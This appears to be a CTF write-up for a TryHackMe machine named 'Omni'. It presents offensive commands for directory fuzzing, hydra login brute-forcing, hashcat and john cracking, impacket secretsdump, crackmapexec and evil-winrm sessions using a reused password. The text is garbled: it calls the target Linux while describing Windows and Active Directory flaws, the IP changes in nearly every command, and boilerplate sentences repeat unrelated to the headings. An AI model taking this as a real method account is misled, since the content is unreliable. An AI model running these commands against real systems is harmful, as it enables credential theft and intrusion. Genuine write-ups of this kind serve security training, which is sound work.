---
TitleSEO: "TryHackMe — Omni (Medium Linux) | ZureFX"
TitlePost: "TryHackMe — Omni (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Omni. Unquoted Service Path and ACL Abuse to achieve medium compromise on Linux."
Keywords: "medium, windows, web, offsec, tryhackme, hackthebox, ctf"
URL: "https://zurefx.github.io/writeups/htb-omni-333.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-omni-333/"
Date: "2025-08-29"
Tags: "Medium, Windows, Web, OffSec, TryHackMe, HackTheBox, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-omni-333"
Permalink: "/writeups/htb-omni-333.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Omni** is rated **Medium** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.119.55.72`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.126.73.193/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.90.139.86/FUZZ
```

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.12.238 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.70.100.157 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

### Web Enumeration

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Unquoted Service Path**.

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.33.158.15
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.147.24 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.98.124.107 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.53.119.110 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.137.218/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `atexec`
- `psexec`
- `sqlmap`
- `ldapsearch`
- `msfvenom`
- `sharphound`
- `GetUserSPNs`

### Key Takeaways

- Unquoted Service Path
- ACL Abuse
